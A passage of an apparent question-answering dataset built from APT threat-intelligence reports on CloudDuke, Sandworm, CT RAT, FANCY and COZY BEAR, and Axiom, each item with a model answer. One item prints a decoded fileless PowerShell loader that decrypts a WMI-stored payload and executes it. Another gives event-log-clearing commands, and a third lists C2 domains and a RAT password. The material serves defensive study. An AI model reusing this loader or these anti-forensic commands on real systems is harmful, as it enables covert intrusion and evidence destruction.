  },
  {
    "instruction": "Medium Headline: CloudDuke/ MiniDionis/ CloudLook\nDiscovered in June 2015, CloudDuke is the most recent Duke campaign. The campaign may be a tactical shift in response to the widespread disclosure of the other Duke campaigns by security firms such as Kaspersky, Symantec, and F-Secure. CloudDuke relies on spear phishing emails that closely resemble those deployed in the CozyDuke campaign. The CloudDuke emails contain a self-extracting archive attachment that appears as an empty voicemail file (.wav) or a PDF file (often containing the word \"terrorism\"). If opened, then the second stage dropper executes. So far, the campaign has targeted European diplomatic organizations.\nThe CloudDuke malware is comprised of a downloader, a loader, and two backdoors, which download and execute from either web address or from a Microsoft OneDrive account. The malware maps a OneDrive cloud storage drive as a network drive using hardcoded credentials and then it downloads its backdoors to the local system. The downloader may also download and execute additional malware, likely another Duke malware, from a preconfigured location. CloudDuke's backdoor functionality resembles that of SeaDuke. One backdoor will contact a preconfigured C&C server while the other relies on a Microsoft OneDrive account. As per its name, CloudDuke uses cloud storage services for its command and control infrastructure as well as its data exfiltration method.\nMedium Headline: Sandworm/ Quedagh/ BlackEnergy\nThe Sandworm team is a Russian advanced persistent threat group that targets systems of political targets of interest to the Russian Federation. Sandworm is likely state-sponsored. The group's name originates from strings in their code and names of their C&C servers that reference the Dune fantasy book series.\nSandworm has targeted governments and political organizations since at least 2009; but the group also may have been behind the 2008 cyber-attacks against Georgia. The Ukrainian government, NATO, the European Union, the European Telecommunications sector, European Energy companies, and Poland are among the group's top targets. Attendees of the May 2014 Globesec conference were also targeted. Many of the decoy documents used to deploy the malware were spoofed news coverage of political or economic situations in Europe.\nThe new variant of the BlackEnergy malware, which is now capable of stealing documents from targets, has been used against government institutions in Ukraine and Eastern Europe. The initial appearance of the malware coincides with the conflict between Russia and Ukraine. Trend Micro discovered that the newest variant of the malware, customized by the group, can target ICS and SCADA systems. The group may have infected these systems to monitor or sabotage systems that compete with Russia's energy interests.\nSandworm delivers malware through spear phishing emails containing malicious documents, such as a Microsoft PowerPoint attachment. The attachments either deliver the initial dropper or exploit a zero-day vulnerability to install the malware. In some cases, legitimate applications were trojanized to perform the installation. Through zero-day exploits, the malware infects any system running a Windows Operating System ranging from Vista to Windows, including Windows server systems. The malware only infects the victim system if the current user is a member of the local administrator group. If the user is not an administrator, then the malware will attempt to re-launch itself as Administrator or exploit the Windows backward compatibility features to bypass UAC.\nThe BlackEnergy crimeware appeared for sale in underground Russian cyber-markets around 2007. The malware was designed to create botnets for Distributed Denial of Service attacks (DDoS), but it has since evolved to support other capabilities. BlackEnergy can create botnets to send spam emails for phishing campaigns and it has tools to harvest passwords and banking credentials from infected computers.\nThe BlackEnergy toolkit gained notoriety during the 2008 cyber-attacks on Georgia during the conflict between Russia and Georgia. The BlackEnergy malware is available for\npurchase in cyber underground communities; however, the variant used in Sandworm attacks has been modified with custom code, incorporates a proxy server infrastructure, techniques to User Account Control and driver signing features in 64-bit Windows systems, and tools to collect documents. F-Secure notes BlackEnergy is used by a variety of criminal and cyber espionage groups; so, Sandworm's adoption of BlackEnergy, instead of writing custom malware, may have been an attempt to shirk attribution and blend into the crowd of nefarious actors to remain undiscovered.\nThe BlackEnergy toolkit features a builder application that generates the clients used to infect victim systems, it features server-side scripts to create C&C servers, and it includes an interface for the attacker to communicate with their botnet. F-Secure comments that the toolkit is simple enough and convenient enough that anyone can build a botnet without possessing extensive skills. The information stealing plugin of the toolkit gathers system information, session information, a list of installed applications, a list of registered mail, browser, and instant messaging clients, a list of network connections, and stored user credentials for online and offline accounts, and exfiltrates the information back to the C&C server via a HTTP POST request. New variants of the malware may also be able to capture screenshots and record audio. On December 23, 2015, a Sandworm campaign against the Prykarpattyaoblenegro power plant in Ukraine caused a severe outage. More significant than the immediate loss of power, the threat actor, who is likely backed by the Russian state, demonstrated that the malware, which has been regularly discovered on U.S. networks, can severely cripple a nation's critical infrastructure as part of a cyber-physical campaign.\nRead the text above and answer this question: How does the CloudDuke malware leverage cloud storage services for its operations, and what are the implications of this approach?",
    "output": "CloudDuke uses cloud storage services, specifically Microsoft OneDrive, for both its command and control (C&C) infrastructure and its data exfiltration method. The malware maps a OneDrive cloud storage drive as a network drive using hardcoded credentials and then downloads its backdoors to the local system. This approach allows the malware to blend in with legitimate traffic and makes it harder for traditional security measures to detect and block its activities. Additionally, using cloud services for C&C and data exfiltration can make it more challenging to attribute the attack to a specific actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: CT RAT\nThis remote administration tool is often used by the Pitty Tiger group. We have been able to acquire both the client and the server parts.\nWe found two instances of the same binary with different names \u2013 32mm.exe and mm32.exe 1 .\nThis RAT seems to be an evolution of PittyTiger, since a specific server binary we found could handle both requests from CT and PittyTiger, and was indicated as compatible with PittyTiger. Moreover, the same commands are implemented in both RATs.\nMedium Headline: Command & Control\nThe RAT communication is performed through HTTP requests. The data is sent encrypted with RC4, and base64-encoded. The RC4 key is the Unicode form of the requested URL.\nThe Login packet contains the following string, after decoding and deciphering:\nIt contains the computer name, the user name, the internal IP address, the OS version, the RAT internal version and the Language ID of the system.\nThe RAT can then receive commands from its c&c. Usual RAT features are implemented:\n- File Download (GET) and Upload (PUT)\n- Remote shell (ocmd/ccmd)\n- Configuration update (cfg)\n- Sleep (sleep)\nMedium Headline: Version and author(s)\nRegarding the configuration, our sample communicates with \"sop.avstore.com.tw\", and contains the string \"Nov 13 2013\", which should be a version identifier.\nThe c&c part is a Windows binary written in .NET. We found 2 versions:\n- Version 2013.10: CT only controller\n- Version 2013.12: CT and PittyTiger controller\nThe About form gives the name of the developer(s):\nPublic release\nThe version of the controller which can handle both PittyTiger and CT shows the same author(s):\nCT/PittyTiger controller\nAs these screenshots show, the switch between PittyTiger and CT was probably in the last semester of 2013.\nThe text can be translated, thanks to Google Translate, as:\nFurther discussion about this author is provided in subsequent sections.\nMedium Headline: Installation\nThe binary we found is named 3200.exe 1, and triggers the following alarms in our sandbox:\nThe \"release.tmp\" file is dropped on the system:\n1 MD5 hash: 728d6d3c98b17de3261eaf76b9c3eb7a\nThe binary is also copied to the user's \"Application Data\" directory, and injects the \"release.tmp\" file in \"explorer.exe\".\nPersistence is achieved by adding the path to the binary to the Winlogon Shell key:\nThe RAT embeds its own DNS server IP addresses to make the c&c domain names resolutions. These addresses are listed below:\n- 63.251.83.36\n- 64.74.96.242\n- 69.251.142.1\n- 212.118.243.118\n- 216.52.184.230\n- 61.145.112.78\n- 218.16.121.32\nMedium Headline: Command & Control\nIt starts resolving its domains after injection, and immediately sends requests. First requests are used to check for updates (GET request on /httpdocs/update/update.ini). A Hello packet is then sent:\nThe bot then repeatedly sends GET requests on \"/httpdocs/mm/<bot_id>/ComMand.sec\" to retrieve remote commands.\nThe communication protocol is quite simple: GET requests are used to receive data from the c&c, and POST requests to send data. In POST commands, the CGI name represents the command.\nThe following features are implemented:\n- c&c authentication using password\n- Remote shell\n- Remote commands\n- File Download / Upload / Deletion / Search\n- Bot termination\nThe following CGI files can be requested by the bot:\n- Vip: test for connectivity\n- Owpp4: register new bot\n- CReply: answer to remote commands\n- Clrf: clear remote file (to clear ComMand.sec after reading)\n- CFile: transmit file (file transfers or answers to commands)\n- Cerr: send error\nThe configuration is stored locally in a file called \"schmup.sys\". The file is ciphered using RC4, using the MD5 hash of \"rEdstArs\" as the key.\nOur sample uses \"mca.avstore.com.tw\", \"star.yamn.net\" and \"bz.kimoo.com.tw\" as c&c servers. It contains the \"1.6.0\" version number, and uses the password \"9ol.8ik,\" to authenticate with the bots.\nUnlike others c&c binaries, the c&c part of this RAT does not have a graphical interface, but can be remotely requested to manage the bots. Furthermore, no authentication is required to send commands to the c&c (but you need to know the configured password to interact with the bots).\nThe management protocol is the same as the bots protocol, with different CGI files:\n- Shutdown: shutdown the c&c\n- Cnor: add a new command for a bot (writes it in \"ComMand.sec\")\n- Mlist: get the list of bots\n- Mlist2: write the list of bots to the file \"Online.dat\"\nThe bots' answers to remote commands can be retrieved by requesting the \"Reply.sec\" file (e.g. GET /httpdocs/mm/<bot_id>/Reply.sec)\nMedium Headline: Network patterns\nThese network patterns might ring bells in some researcher's minds. The network communication used by this binary are the same as those used by the Enfal malware, which has been used in the past by the Lurid group (APT attackers) and by other threat actors in China 1 .\nAn examination of the code did not reveal code similarities with the Enfal malware. We do not currently know why this malware uses the same patterns to communicate.\n\nQ: Describe the command and control (C&C) protocol used by the CT RAT, including the types of requests and the purpose of each CGI file.",
    "output": "A: The CT RAT uses a simple communication protocol where GET requests are used to receive data from the C&C server, and POST requests are used to send data. The CGI name in POST commands represents the command. Key features include C&C authentication using a password, remote shell, remote commands, file operations (download, upload, deletion, search), and bot termination. Specific CGI files requested by the bot include 'Vip' for connectivity testing, 'Owpp4' to register a new bot, 'CReply' to answer remote commands, 'Clrf' to clear remote files, 'CFile' for file transfers or command responses, and 'Cerr' to send errors. The configuration is stored locally in a file called 'schmup.sys', encrypted using RC4 with the MD5 hash of 'rEdstArs' as the key. The C&C server can be remotely managed without a graphical interface, using commands like 'Shutdown', 'Cnor', 'Mlist', and 'Mlist2'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT30 use phishing as a tactic to achieve its goals of data theft for political gain, and what specific techniques do they employ to target their victims?",
    "output": "Phishing is a type of social engineering attack where adversaries send electronically delivered messages to gain access to victim systems. In the case of APT30, phishing is used as a tactic to achieve its goals of data theft for political gain. According to the analysis of APT30's activities, the group has been observed to use phishing decoy document content and intended recipients to target national governments, regionally based companies, and members of the media who report on regional affairs and Chinese government issues. APT30 has also been known to leverage major political transitions as phishing lure content in campaigns geared towards key political stakeholders. Furthermore, the group has used repeated decoy subjects on India-China military relations and contested regions to target its victims. APT30's use of phishing techniques is part of its larger strategy to compromise entities across Southeast Asia and India, and to steal sensitive data from a variety of targets, including classified government networks and other networks inaccessible from a standard Internet connection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: This decodes to:\nfunction perfCr($crTr, $data){\n$ret = $null\ntry{\n$ms = New-Object System.IO.MemoryStream\n$cs = New-Object System.Security.Cryptography.CryptoStream -ArgumentList @($ms, $crTr, [System.Security.Cryptography.CryptoStreamMode]::Write)\n$cs.Write($data, 0, $data.Length)\n$cs.FlushFinalBlock()\n$ret = $ms.ToArray()\n$cs.Close()\n$ms.Close()\n} catch{} return $ret\n}\nfunction decrAes($encData, $key, $iv)\n{\n$ret = $null\ntry{\n$prov = New-Object System.Security.Cryptography.RijndaelManaged\n$prov.Key = $key\n$prov.IV = $iv\n$decr = $prov.CreateDecryptor($prov.Key, $prov.IV)\n$ret = perfCr $decr $encData\n} Catch{} return $ret\n}\nfunction sWP($cN, $pN, $aK, $aI)\n{\nif($cN -eq $null -or $pN -eq $null){return $false} try{\n$wp = ([wmiclass]$cN).Properties[$pN].Value\n$exEn = [Convert]::FromBase64String($wp)\n$exDec = decrAes $exEn $aK $aI\n$ex = [Text.Encoding]::UTF8.GetString($exDec) if($ex -eq $null -or $ex -eq \")\n{return}\nInvoke-Expression $ex return $true\n}\ncatch{ return $false\n} }\n$aeK = [byte[]] (0xe7, 0xd6, 0xbe, 0xa9, 0xb7, 0xe6, 0x55, 0x3a, 0xee, 0x16, 0x79, 0xca, 0x56, 0x0f, 0xbc, 0x3f, 0x22, 0xed, 0xff, 0x02, 0x43, 0x4c, 0x1b, 0xc0, 0xe7, 0x57, 0xb2, 0xcb, 0xd8, 0xce, 0xda, 0x00)\n$aeI = [byte[]] (0xbe, 0x7a, 0x90, 0xd9, 0xd5, 0xf7, 0xaa, 0x6d, 0xe9, 0x16, 0x64, 0x1d, 0x97, 0x16, 0xc0, 0x67) sWP 'Wmi' 'Wmi' $aeK $aeI | Out-Null\nThis one-line powershell command, stored only in WMI database, establishes an encrypted connection to C2 and downloads additional powershell modules from it, executing them in memory. In theory, the additional modules can do virtually anything on the victim system. The encryption keys in the script were different on every system. Powershell version of credential theft tool MimiKatz was also used by the actors to facilitate credential acquisition for lateral movement purposes.\nFANCY BEAR adversary used different tradecraft, deploying X-Agent malware with capabilities to do remote command execution, file transmission and keylogging. It was executed via rundll32 commands such as:\nrundll32.exe \"C:\\Windows\\twain_64.dll\"\nIn addition, FANCY BEAR's X-Tunnel network tunneling tool, which facilitates connections to NAT-ed environments, was used to also execute remote commands. Both tools were deployed via RemCOM, an open-source replacement for PsExec available from GitHub. They also engaged in a number of anti-forensic analysis measures, such as periodic event log clearing (via wevtutil cl System and wevtutil cl Securitycommands) and resetting timestamps of files.\nIntelligence collection directed by nation state actors against US political targets provides invaluable insight into the requirements directed upon those actors. Regardless of the agency or unit tasked with this collection, the upcoming US election, and the associated candidates and parties are of critical interest to both hostile and friendly nation states. The 2016 presidential election has the world's attention, and leaders of other states are anxiously watching and planning for possible outcomes. Attacks against electoral candidates and the parties they represent are likely to continue up until the election in November.\nIndicators of Compromise:\n\nBased on the above text, answer a question. What are the key differences in the tradecraft employed by FANCY BEAR compared to COZY BEAR, and how do these differences impact the detection and mitigation strategies?",
    "output": "FANCY BEAR employs different tradecraft compared to COZY BEAR. FANCY BEAR uses the X-Agent malware, which has capabilities for remote command execution, file transmission, and keylogging. It is executed via `rundll32` commands and utilizes the X-Tunnel tool for network tunneling, facilitating connections to NAT-ed environments. Additionally, FANCY BEAR deploys these tools using RemCOM, an open-source replacement for PsExec. They also engage in anti-forensic measures such as clearing event logs and resetting file timestamps. In contrast, COZY BEAR relies on PowerShell scripts and WMI for persistence. The differences in tradecraft impact detection and mitigation strategies by requiring defenders to monitor for different types of activities and tools. For example, defenders need to look for unusual `rundll32` commands, network tunneling activity, and the use of RemCOM, in addition to PowerShell scripts and WMI events.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4 Comparing Ukraine to Estonia and Georgia\nContrasting Russian cyber activities in Ukraine with Estonia and Georgia is helpful in assessing their use and value, as well as in considering what new norms might look like. The cyber attacks in Estonia8, composed of service disruptions and denial\nof service incidents, could best be compared to the online equivalent of a noisy protest in front of government buildings and banks. They had little tangible effect, but they created uncertainty and fear among Estonian leaders as they were considered a potential precursor to armed Russian intervention. In Georgia9, cyber attacks were closely coordinated with Russian military operations.\n8 Eneken Tikk, Kadri Kaska and Liis Vihul. International Cyber Incidents: Legal Considerations (Tallinn, Estonia: NATO Cooperative Cyber Defence of Excellence, 2010).\nThe effects of the cyber attacks in Estonia and Georgia deserve more careful study. The attacks did not cripple or bring Estonia to its knees, and NATO's decision not to invoke Article V reflects this fact. They were frightening not because of the cyber effect, but because of Estonian concerns about Russian intentions, NATO's reliability, and their internal Russian-speaking minority. Similarly, cyber attacks on Georgia were largely symbolic. The most visible incident was the defacement of the Georgian President's website by Russian hackers, who drew moustaches on his photograph. The most interesting part of the Georgia episode was the close operational coordination between the hackers and the Russian military. The Russians continue to experiment with cyber tools to support their political objectives.\nIf the Russian goal in Ukraine is to shape global public opinion, there were some early successes in painting the Ukrainians as 'fascists' (a favoured communist insult) guilty of human rights violations. But no one believes that anymore, and the tide of public opinion has turned heavily against Russia. A recent Pew Research survey on global opinion captures the change and is entitled 'Russia, Putin, Held in Low Esteem around the World'. 10  In this, the current Russian regime has not done as well as its communist predecessors, who could at least cloak their actions in the rhetoric of Marxism. Russia's current effort to hire hundreds of internet trolls11 to insert pro-Russian opinions in the Western press has proven to be feckless. Perhaps the benefit is domestic, persuading the Russian population of the righteousness of Russia's course of action,12 but as a tool of coercion, the absence of informational disruption (as in the case of Sony or Aramco) or physical effects (as with Stuxnet) makes Russian cyber operations annoying, but ultimately inconsequential.\nIf the Russian goal is to shape global public opinion, there were early successes in painting the Ukrainians as 'fascists'.\nThe most successful Russian tactics were creating or supporting pro-Russian separatist groups in areas with significant Russian-speaking minorities and then using Russian special and ultimately conventional forces to stiffen and protect these groups from the Ukrainian response. Cyber attack was largely irrelevant.\n9 Ibid.\n10 Bruce Stokes. 'Russia, Putin, Held in Low Esteem around the World,' Pew Research Centre, 5 August 2015, http://www.pewglobal.org/2015/08/05/russia-putin-held-in-low-regard-around-the-world/.\n11 See, for example, Dmitry Volchek and Daisy Sindelar, 'One Professional Russian Troll Tells All,' RadioFreeEurope/RadioLiberty, 25 March 2015, sec. Russia, http://www.rferl.org/content/how-to-guide-russian-trolling-trolls/26919999.html.\n12 Katie Simmons, Bruce Strokes and Jacob Poushter. 'NATO Publics Blame Russia for Ukrainian Crisis, but Reluctant to Provide Military Aid,' Pew Research Centre, 15 July 2015, http://www.pewglobal.org/2015/06/10/2-russian-public-opinion-putin-praised-west-panned/.\nBoth Western and Russian analysts may have drawn the wrong lessons from Estonia and Georgia. States (especially states with a fondness for Lenin) will use cyber attacks for politically coercive purposes and might use them for military purposes, to disrupt data or services. But the incidents in Ukraine did not disrupt command and control, deny access to information, or have any noticeable military effect.\nThis means that we (and the Russians) may overestimate the coercive effect of cyber attacks and that their real military value is achieved when there is physical effect or disruption of data and critical services, something that most denial of service attacks cannot produce. Cyber attacks are a support weapon and will shape the battlefield, but by themselves they will not produce victory. Cyber attacks support other weapons and operations, as in the 2007 Israeli attack against Syrian air defence. This is still a subject of intense debate, but experience suggests that it is easy to exaggerate the effect of cyber attack. A more accurate assessment would rank cyber activities into three categories: espionage, operational, and political. However, note that the benefits of the former are clear, while the latter are open to question.\nIf cyber is the weaponisation of signals intelligence, there must be physical damage.\nTo provide strategic or military effect, cyber actions must produce destructive effect and be integrated into existing military structures, doctrine, planning, and operations. Estonia and Georgia can be contrasted with two known attacks that did have military effect. The Israeli air strike against a Syrian nuclear facility is reported to have used cyber means to disrupt Syrian air defence radars, allowing the aircraft to fly undetected across much of the country.13 In this case, there was no physical damage but a vital service was disrupted. With Stuxnet, there was physical damage, albeit inflicted covertly, that could be duplicated in overt warfare, noting that a degree of caution is warranted to predict the effect of cyber attacks on civilian infrastructure.14 We should also note the reported use of cyber techniques by the U.S. to disrupt or confuse Taliban command and control, often with lethal results for the insurgents.15 If cyber is the weaponisation of signals intelligence, it appears that to have actual military effect, there must be physical damage.\nThis is a consideration of cyber as a tool of military action and does not consider either traditional methods of electronic warfare, which Russia has used extensively in Ukraine,16 nor the intelligence value of Russian cyber espionage. We do not know the role cyber espionage played in these efforts, but if Russian successes against the United States are any guide, we can assume cyber spying made a positive contribu-\ntion. That Russia has completely penetrated Ukrainian communication networks and has unparalleled access to Ukrainian communications is likely to provide considerable value for Russian tactics and planning, but cyber as a tool of coercion has proven to be of limited utility.\n13 David Makovsky. 'The Silent Strike: How Israel bombed a Syrian nuclear installation and kept it secret,' The New Yorker, 17 September 2012, http://www.newyorker.com/magazine/2012/09/17/the-silent-strike.\n14 Kim Zetter. 'An Unprecedented Look At Stuxnet, The World's First Digital Weapon,' Wired, 3 November 2014, http://www. wired.com/2014/11/countdown-to-zero-day-stuxnet/.\n15 Interviews with US military officials.\n16 Joe Gould. 'Electronic Warfare: What US Army Can Learn From Ukraine,' Defense News, 4 August 2015, http://www.defense-news.com/story/defense/policy-budget/warfare/2015/08/02/us-army-ukraine-russia-electronic-warfare/30913397/.\nThis is certainly not the cyber war as it is often depicted in public media, but it does not mean that cyber attack is overrated and militaries can deemphasise it. That would be a rash conclusion. It means that the Russians, for whatever reason, chose not to use the most damaging forms of cyber attack against Ukraine, Georgia, or Estonia. If allegations that Russia were responsible for damaging cyber attacks on a German steel mill17 and a Turkish pipeline18 are correct, these would demonstrate that Russia has the capability necessary for cyber attacks that would create physical damage and qualify as a use of force. Russia's 2008 exploit in penetrating Central Command's classified networks19 was an early demonstration of its ability to implant malware on an opponent's networks that could erase data and disrupt command and control, but the Russians chose not to do this.\nIn Ukraine, Russia has experimented with how best to produce military and political benefits from cyber operations. Political context and alliance relationships have a powerful influence in constraining the use of force, including cyber attacks. Its cyber actions appear to reflect a decision not to engage the full range of Russian cyber capabilities. Other potential opponents, including NATO, should not assume that in the event of conflict, the Russians will make the same decision.\n17 'Hack attack causes 'massive damage' at steel works,' BBC, 22 December 2014, (<http://www.bbc.com/news/technology-30575104>)http://www.bbc.com/news/technology-30575104.\n18 Ariel Bogle. 'A Cyber Attack May Have Caused a Turkish Oil Pipeline to Catch Fire in 2008,' Slate, 11 December 2014, http:// www.slate.com/blogs/future_tense/2014/12/11/bloomberg_reports_a_cyber_attack_may_have_made_a_turkish_oil_pipeline_catch.html.\n19 Phil Stewart and Jim Wolf. 'Old worm won't die after 2008 attack on military,' Reuters, 16 June 2011, (<http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617>)http://www.reuters.com/ (<http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617>)article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617.\nQ: What are the three categories of cyber activities mentioned in the section, and how do their benefits differ?",
    "output": "The three categories of cyber activities mentioned are espionage, operational, and political. Espionage involves gathering intelligence, and its benefits are clear. Operational activities involve using cyber means to support military operations, such as disrupting enemy services or causing physical damage. Political activities aim to shape public opinion or achieve political objectives through cyber means, but their benefits are open to question and have proven to be of limited utility in terms of coercion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 5 Timeline of the Attack\nThe attack can roughly be divided in three phases.\n\u25a1 The first phase was the initial compromise and achievement of objectives. The objectives included the privilege escalation and espionage of intellectual property.\n\u25a1 The second phase was the persistence phase, which lasted for seven months.\n\u25a1 In the final phase, the attackers changed their persistence strategy from Phase 2 and attempted to exfiltrate data again. This was likely a reaction to a detection of an attack to another company with the same IOCs.\nThe following table describes the timeline of the attack with anonymous hostnames. The timestamps were converted to UTC+0. The \"Attacker\" column describes which resource (IP, compromised system, etc.) the attacker uses, and the \"Target\" column describes the system, which is targeted by the activity.\nTimestamp20 (<>)\nTarget\nAttacker\nComment\n20 All timestamps in this report are given in UTC+0\nInternet Cutoff and Remediation\nQuestion: Can you explain the different phases of the EmissaryPanda attack and how the attackers adapted their persistence strategy over time?",
    "output": "Answer: The EmissaryPanda attack can be divided into three distinct phases. The first phase involved the initial compromise and achievement of objectives, including privilege escalation and espionage of intellectual property. The second phase was the persistence phase, which lasted for seven months. During this phase, the attackers maintained their presence within the compromised environment. In the final phase, the attackers changed their persistence strategy from Phase 2 and attempted to exfiltrate data again. This change in strategy was likely a reaction to the detection of an attack on another company with the same Indicators of Compromise (IOCs), indicating that the attackers were aware of potential detection and adapted their methods accordingly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Remediation\nCurrently, organizations that wish to protect themselves from the malware that Axiom has been observed using should download and utilize the latest MSRT release. This tool has been verified to provide protection against malware families that Axiom favors, and is freely available to all Microsoft installations. It is suggested that enterprise organizations push out and execute MSRT on a monthly basis. Additionally, all members of the Operation SMN group have up-to-date signatures and heuristics for detecting the Axiom malware families, as well as any vendors involved in Microsoft's VIA program.\nIt is strongly advised that organizations seeking protection from Axiom avoid the temptation of solely deploying network based signatures. Because Axiom continually creates new C2 infrastructure for each new target and can quickly transition to new malware tooling, it is very unlikely that existing network IOCs will offer any meaningful level of protection for organizations whose infections are new or previously undiscovered.\nNetwork operators can and should learn from the Axiom group's tradecraft; security teams and IT staff should be especially wary of any traffic going to destination servers that does not match the apparent intent of these servers. For example, large data transfers moving towards DNS nameservers on port 53 with no observable DNS content that are associated with known or related partners should be viewed as suspect. Hikit's usage of internally routed proxy nodes can complicate this task, and only advanced network analytics that includes a holistic view of internal and external network traffic can provide anything near 100% certainty. Network boundaries of all types should be monitored. If an internal network can route from restricted zones to ones of lower restriction, it should be monitored for data exfiltration in the same manner as a traditional border network. Above all there is absolutely no substitute for continued vigilance -- by the time Hikit is installed on a victim's infrastructure, the operation is in its final stages, and the attackers generally have free reign over the victim network.\nEnterprises are advised that while Axiom represents an advanced attacker, their power comes from their discipline and logistics. Ultimately, the removal of common \"low hanging fruit\" in network and endpoint security will go far to prevent Axiom from easily accessing networks. Additional suggestions for protection against Axiom's attacks would be:\n\u25cf Block or sinkhole the DNSPOD name servers. DNSPOD seems to be the preferred provider for DNS services for Axiom, and many organizations can block these resources without adverse effect on business needs.\n\u25cf Install and execute Microsoft's EMET on endpoint machines, and configure it to your environment.\n\u25cf Globally edit Windows policies to disable the \"Sticky Keys\" functionality.\n\u25cf Restrict all remote access (RDP, SSH, Citrix, VPN, etc.) and ensure that this access is only given to people that need it versus by default for the whole company; wherever possible, implement two-factor authentication for any remote access.\n\u25cf Keep strong monitoring on VPN endpoints -- Axiom has demonstrated the ability to enter networks after compromising VPN client user credentials.\n\u25cf Two-factor protection to webmail services should be added where possible.\n\u25cf Ensure that local administrative accounts are not universal across your network, as a single compromise can bring the security of the entire network into question. Ensure that local firewalls are configured and restrict access to both servers and workstations to only those subnets and users that require it.\n\u25cf Implement application whitelisting to prevent execution of unauthorized executables -- Microsoft AppLocker, Bit9, and other third party solutions are all improvements over default installations without whitelisting.\n\u25cf Encrypt e-mail where possible, even between internal users.\n\u25cf Ensure antivirus software is reporting to a central, monitored location. Axiom's binaries can flag AntiVirus rules that end up ignored, a security failing that they rely on.\n\u25cf Ensure proper auditing and review of security firewall rules, antivirus updates, IDS signatures, and other security controls. Axiom actors during active compromises have been observed to disable key signatures or rules to force victim organizations to lose visibility.\n\u25cf Apply security patches in a timely manner. While Axiom does make use of 0-day vulnerabilities, the group has also used disclosed, patched vulnerabilities that are found on outdated systems in a target's network.\n\u25cf Reference information provided by the FBI in their FLASH report - additional remediation information and suggestions are included36.\n36 http://www.slideshare.net/ragebeast/infragard-hikitflash\nBig Headline: Kudos\nOperation SMN and the subsequent actions taken by the group members could not have occurred without the generosity and talent of several organizations. While the publicly acknowledged members of the group made critical contributions there are other firms that were critical to the findings contained in this report. Their datasets, services, and software allowed coalition members to construct a substantially stronger case than would have been otherwise possible. Farsight Security generously provided Novetta with unrestricted access to their historical passive DNS dataset, allowing analysts to investigate the C2 infrastructure used by Axiom over a wide window of time. Endgame provided Novetta with extensive proprietary threat data and analytical processing capabilities allowing Novetta to gain a deeper insight into compromised network footprints. Novetta would also like to thank those organizations and individuals who quietly contributed to the content covered in this report.\nSmall Headline: Interesting Facts:\n\u25cf Relies on a NDIS (network) driver to communicate between the network and the malware\n\u25cf The infected machine acts as the server while the controlling machine is the client , therefore at least one Hikit infection must be on an internet facing machine\n\u25cf Contains no configuration information at all\n\u25cf The NDIS (network) driver is a mixture of several open source pieces of code, most notably the passthru NDIS driver example from a 2003 blog37 .\n\u25cf The client authenticates to the server at the NDIS driver layer by providing a specific set of strings that mimic HTTP requests\n\u25cf Authors routinely forgot to remove the PDB strings revealing at least two compile machines\n\u25cf Earliest known variants from early 2011\n37 http://www.wd-3.com/archive/extendingpassthru2.htm\nSmall Headline: Interesting Facts:\n\u25cf Comes in 64-bit and 32-bit versions depending on the target's infrastructure\n\u25cf 32-bit versions use a rootkit driver to hit the malware process, network endpoints, registry keys and files.\n\u25cf The rootkit is based heavily on the Agony rootkit which is open source\n\u25cf Unlike Gen1, the malware acts as a client to the C2's server.\n\u25cf Uses the same XOR encryption scheme as Gen 1\n\u25cf Developmental overlap found between Gen 1 and Gen 2 (new Gen1 sample found during the Gen 2 time span)\n\u25cf Has at least 5 known sub-generations with the Gen 2 lineage\n\u25cf Spanning from late 2011 to 2013\nSmall Headline: Interesting Facts:\n\u25cf Evidence suggests that Zox has variants dating back to at least 2008, and may have multiple generations, and may have evolved from a simple spreader into something a bit more RAT like.\n\u25cf Uses PNG file format as the carrier format for data to and from the C2\n\u25cf The sample from 2008 uses SMB to communicate indicating it was originally a local exploitation tool instead of a remote tool\n\u25cf Does not contain any C2 information as the attacker must provide the information at runtime via the command line\n\u25cf Evidence in Zox family of tools suggests a focus on China, Taiwan, US/UK, Korean language sets for exploits offsets leveraged in spreading functionality.\n\u25cf Was observed being leveraged by attackers via base64 encoded cab file that was then installed via a login script for a specific user. Very few samples have been found compared to all the other malware families the effort is tackling.\nSmall Headline: Capability Features:\n\u25cf File management: upload, download, create directory, list files, enumerate entire folder trees, move files, delete files, rename files, get file attributes, mimic timestamps of other files (e.g. copying the timestamp of kernel32.dll to another file to allow for blending in)\n\u25cf Derusbi may have a windows GUI component for the operator (based on file system behavior, and patterns of use).\n\u25cf Remote shell\n\u25cf Basic (limited) network proxying\nSmall Headline: Interesting Facts:\n\u25cf Uses a 64-byte handshake of seemingly random data with four bytes specifically configured to act as the handshake\n\u25cf The infected machine acts as the server while the controlling machine (the attacker's machine) is a client (the reverse of typical malware communication)\n\u25cf Does not contain any configuration information related to the attacker's IP, only contains the campaign code\n\u25cf Appears to be able to co-exist with other running services on the same port [unconfirmed, but speculated based on network capture evidence]\nBig Headline: Appendix E: Malware Hashes\nTo the best of our abilities, Novetta has filtered some of the sample hashes collected from the below sample hashes. This has been due to the highly targeted nature of some of the malware samples Operation SMN has collected. The defensive value of knowing those samples or the hashes for organizations other than the targeted is nil given the technical information produced and shared by this effort. The below hashes are for sample families that leverage shared generic infrastructure between multiple compromised infrastructure or contain no configuration information in the binary.\n\nWhat specific network behaviors should security teams look out for to detect potential Axiom activity, and why are these behaviors significant?",
    "output": "Security teams should be wary of any traffic going to destination servers that does not match the apparent intent of these servers. For example, large data transfers moving towards DNS nameservers on port 53 with no observable DNS content that are associated with known or related partners should be viewed as suspect. Hikit's usage of internally routed proxy nodes can complicate this task, and only advanced network analytics that includes a holistic view of internal and external network traffic can provide anything near 100% certainty. Monitoring network boundaries of all types is essential, as internal networks that can route from restricted zones to ones of lower restriction should be monitored for data exfiltration in the same manner as a traditional border network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
